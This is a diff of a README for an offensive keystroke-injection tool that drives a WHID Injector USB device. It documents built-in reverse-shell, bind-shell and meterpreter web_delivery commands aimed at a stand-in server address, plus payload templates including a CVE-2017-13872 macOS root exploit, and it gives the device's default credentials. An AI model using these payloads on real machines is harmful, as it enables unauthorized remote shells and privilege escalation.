@@ -3,18 +3,23 @@
 
 What is it ? It's a simple script to send commands (french keyboard) from your terminal to the WHID Injector. It will automatically convert the "azerty" to "qwerty" format. Furthermore it has builtins payload such as reverse-shell and bind-shell.
 
+**Warning** : Newest version of WHID Toolkit expect the WHID to have a firmware in the prefered language, alternatively you can force the french keyboard with the english firmware using the `--force` arguments.
+
 Where to buy a WHID Injector ? I got mine from [Aliexpress](https://www.aliexpress.com/item/Cactus-Micro-compatible-board-plus-WIFI-chip-esp8266-for-atmega32u4/32318391529.html)
 
 ## How to start
-Connect to the Access Point with the SSID "**Exploit**" with a password of "**DotAgency**".   
-Open a web browser pointed to "**http://192.168.1.1**"    
-The default administration username is "**admin**" and password "**hacktheplanet**".       
-Remember to upgrade the firmware you will find the version 2.7 in this repository    
+ 1. Connect to the Access Point with the SSID "**Exploit**" with a password of "**DotAgency**".   
+ 2. Open a web browser pointed to "**http://192.168.1.1**"   
+    > The default administration username is "**admin**" and password "**hacktheplanet**".       
+
+ 3. Remember to upgrade the firmware you will find the latest version in this repository  
+
 More info on the official Github : https://github.com/whid-injector/WHID
 
+
 ## How to use the script
-```
-python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt -a -h                                                                          127 ↵
+```c
+python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt -h                 
 usage: WHIDInjector.py [-h] [-v] [--host [HOST]] [--port [PORT]]
                        [--user [USER]] [--pass [PASS]] [--panel [PANEL]]
                        [--payload [PAYLOAD]]
@@ -31,14 +36,13 @@ optional arguments:
 ```
 
 Targeting a Windows OS
-```
+```c
 python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt
 ```
 
 Send a simple reverse-shell payload
 ```
-$ python3 WHIDInjector.py -v --host 127.0.0.1 --port 4444                                                                                                                 1 ↵
-
+$ python3 WHIDInjector.py -v --host 127.0.0.1 --port 4444
      -------------------------------------------------------------
       WHID injector - You need to be connected to the Exploit AP
      -------------------------------------------------------------
@@ -61,9 +65,31 @@ Press:176
 Sending payload to http://192.168.1.1/runlivepayload
 ```
 
+## Payloads and commands
+| Commands       | Description                           |
+| :------------- | :-------------                        |
+| bind           | initiate a bind shell on results.port |
+| reverse        | initiate a reverse shell on results.host and results.port|
+| meterpreter [https://YOUR_SERVER_IP:4646/posh-payload] | use exploit/multi/script/web_delivery with a posh-payload    |
+| send some text  | send the specified text              |
+| h               | help                                 |
+| q               | quit                                 |
 
+You can change the options with `SET option_name option_value`
+```c
+>>> set host 192.168.1.12
+>>> set port 4444
+```
 
-# What's next  ?
-TODO change_ssid_name    
-TODO change_ssid_pass    
-TODO update_firmware     
+At the moment the following templates are available, feel free to add more:
+
+| Template | Description |
+| :------------- | :------------- |
+| payloads/osx_high_sierra_root.txt | CVE-2017-13872 |
+| payloads/osx.txt     | execute a command with [Cmd]+[Space] |
+| payloads/windows.txt | execute a command with [Windows]+[R] |
+| payloads/i3.txt      | execute a command with [Windows]+[Enter] |
+| payloads/gnome.txt | execute a command with [Alt]+[F2] |
+| payloads/default.txt | default behavior is the gnome command |
+
+NOTE: The i3 payload uses the [Windows] key as the default modifier, some people prefer to use [CTRL]
